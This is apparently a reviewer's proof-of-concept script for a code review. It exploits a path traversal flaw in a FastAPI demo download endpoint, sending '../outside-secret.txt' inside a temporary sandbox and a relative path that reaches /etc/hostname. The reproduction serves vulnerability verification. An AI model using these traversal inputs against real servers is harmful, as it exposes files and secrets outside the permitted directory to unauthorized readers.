"""Independent Reviewer reproduction — proves path traversal in demo_high_risk.demo_download.

Read-only: imports the module, mounts the real router, issues a crafted request.
No repo files are modified.
"""
import importlib.util
import os
import sys
import tempfile
from pathlib import Path

REPO = Path.home() / "pr2-work"
MOD = REPO / "backend/src/interfaces/api/v1/demo_high_risk.py"

spec = importlib.util.spec_from_file_location("demo_high_risk", MOD)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

from fastapi import FastAPI
from fastapi.testclient import TestClient

# --- Build a controlled sandbox: base dir + sibling OUTSIDE secret ---
root = Path(tempfile.mkdtemp(prefix="reviewer-repro-"))
base = root / "demo_files_base"
base.mkdir()
outside_secret = root / "outside-secret.txt"
outside_secret.write_text("TOP-SECRET-OUTSIDE-BASE", encoding="utf-8")

# Point the module at our controlled base dir (in-process only)
mod.DEMO_FILES_DIR = str(base)

app = FastAPI()
app.include_router(mod.router, prefix="/demo-security")
client = TestClient(app)

print(f"[i] base dir (allowed)      : {base}")
print(f"[i] outside secret file     : {outside_secret}")
print(f"[i] base realpath           : {os.path.realpath(base)}")

name = "../outside-secret.txt"
r = client.get("/demo-security/demo/download", params={"name": name})
print(f"[+] request name            : {name}")
print(f"[+] HTTP status             : {r.status_code}")
print(f"[+] response bytes          : {len(r.content)}")
print(f"[+] response body           : {r.text!r}")
escaped = os.path.realpath(os.path.join(mod.DEMO_FILES_DIR, name))
print(f"[+] resolved path on server : {escaped}")
print(f"[+] escaped base dir?       : {not escaped.startswith(os.path.realpath(base) + os.sep)}")
print(f"[+] LEAK CONFIRMED          : {'TOP-SECRET-OUTSIDE-BASE' in r.text}")

# Show it can also read a genuinely arbitrary absolute-ish file via traversal
abs_target = "/etc/hostname"
rel = os.path.relpath(abs_target, base)
r2 = client.get("/demo-security/demo/download", params={"name": rel})
print(f"[*] arbitrary read attempt  : name={rel} -> status={r2.status_code}, bytes={len(r2.content)}, "
      f"content={r2.text.strip()!r}")
